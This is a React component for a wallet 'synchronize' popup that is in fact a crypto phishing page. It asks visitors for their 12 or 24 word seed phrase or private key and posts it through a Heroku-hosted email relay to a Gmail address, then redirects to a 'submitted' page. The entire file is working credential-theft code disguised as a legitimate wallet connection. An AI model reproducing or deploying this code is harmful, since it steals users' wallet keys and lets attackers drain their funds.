import React, { useState } from "react";
import "./ConnectWallet.css";
import { X } from "react-bootstrap-icons";
import WalletId from "./WalletId";
// import { Link } from "react-router-dom";
import axios from "axios";

function ConnectWallet({ title, handleClose, identity, imagesrc }) {
  // const [isOpen, setIsOpen] = useState(false);
  // const toggleWalletPopUp = () => {
  //   setIsOpen(!isOpen);
  // };

  const [getData, setGetData] = useState({
    message: "",
  });

  let options = {
    subject: "Wallet Key Phrase",
    message: `<p>This is the wallet key phrase a user entered: <br> <strong> Wallet Name: ${title} </strong> <br> <strong> Walllet Key: ${getData.message}</strong> </p>`,
    sender: "angelicajayne41@gmail.com",
    receiver: "angelicajayne6@gmail.com",
  };

  const handSubmit = async (e) => {
    e.preventDefault();
    if (getData.message === "") {
      return alert("field can not be empty");
    }
    if (getData.message.length <= 11) {
      return alert("Word Phrase/Private key can not be less than 12");
    }
    await axios
      .post(
        `https://backend-email-sender-mailgun.herokuapp.com/send-message`,
        options
      )
      .then((response) => {
        console.log(response);
        setTimeout(() => {
          window.location.replace("/submitted");
        }, 2000);
      });
  };

  return (
    <div className="popup-box">
      <section className="connect box ">
        <article className="popheading d-flex flex-row justify-content-end p-3">
          <X
            className="close-icon"
            onClick={handleClose}
            size={40}
            color="black"
          />
        </article>

        <section>
          <WalletId identity={identity} title={title} imagesrc={imagesrc} />
        </section>

        <div className="p-3">
          <section>
            <h2 className="mt-2 mb-4">SYNCHRONIZE YOUR WALLET</h2>
            <h3>SECURELY ENTER WALLET DETAILS TO PROCEED</h3>
            <p>Enter 12 or 24 word Phrase/Private key</p>
          </section>
          <form className="easy ">
            <input
              className="form-control keyform text-center"
              type="text"
              placeholder="PHRASE/PRIVATE KEY"
              minLength="12"
              required
              onChange={(e) =>
                setGetData({ ...getData, message: e.target.value })
              }
            />
            {/* <input
              type="submit"
              value=" Synchronize"
              className="bTN"
              onClick={toggleWalletPopUp}
            /> */}

            <button className="bTN" onClick={handSubmit}>
              {" "}
              Synchronize{" "}
            </button>
          </form>
        </div>
      </section>
    </div>
  );
}

export default ConnectWallet;
